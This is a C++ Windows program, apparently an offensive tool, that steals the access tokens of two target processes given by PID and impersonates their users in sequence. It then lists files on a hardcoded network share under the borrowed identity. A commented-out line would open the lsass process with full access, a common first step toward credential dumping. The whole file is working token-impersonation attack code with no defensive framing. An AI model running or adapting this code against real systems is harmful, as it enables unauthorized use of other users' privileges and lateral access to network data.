
#include <iostream>
#include <Windows.h>
#include <winnetwk.h>
#include <stdio.h>
#include <Lmcons.h>

#ifndef UNLEN
#define UNLEN 256  // Maximum username length in Windows
#endif

#pragma comment(lib, "mpr.lib") 
#define _CRT_SECURE_NO_WARNINGS

static std::string get_username() {
    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    std::wstring username_w(username);
    std::string username_s(username_w.begin(), username_w.end());
    return username_s;
}

void ListFilesInShare(const char* sharePath) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    char searchPath[MAX_PATH];

    // Use sprintf_s for safer string formatting
    sprintf_s(searchPath, MAX_PATH, "%s\\*", sharePath);

    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Failed to list files. Error: %d\n", GetLastError());
        return;
    }

    printf("Files in %s:\n", sharePath);
    do {
        printf("  %s\n", findData.cFileName);
    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

int main(int argc, char** argv)
{
    
    printf("[+] user is: %s\n", (get_username()).c_str());
    HANDLE ProcessToken = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, atoi(argv[1]));
    HANDLE TokenHandle = NULL;
    HANDLE SecondTokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;
    BOOL hToken = OpenProcessToken(ProcessToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
    BOOL impersonateUser = ImpersonateLoggedOnUser(TokenHandle);
    if (GetLastError() == NULL)
    {
        
        HANDLE SecondToken = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, atoi(argv[2]));
        BOOL hSecondToken = OpenProcessToken(SecondToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &SecondTokenHandle);
        BOOL impersonateSecondUser = ImpersonateLoggedOnUser(SecondTokenHandle);
        printf("[+] ImpersonatedLoggedOnUser() success!\n");
        printf("[+] Current user is: %s\n", (get_username()).c_str());
        //HANDLE lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, false, atoi(argv[2]));
        //printf("[&] OpenProcess Error Code is %i", GetLastError());
        ListFilesInShare("\\\\192.168.139.13\\sharing");  // Change this to your network share

        // Revert to original privileges
        
        getchar();


    }
    

    getchar();
    return 0;
}

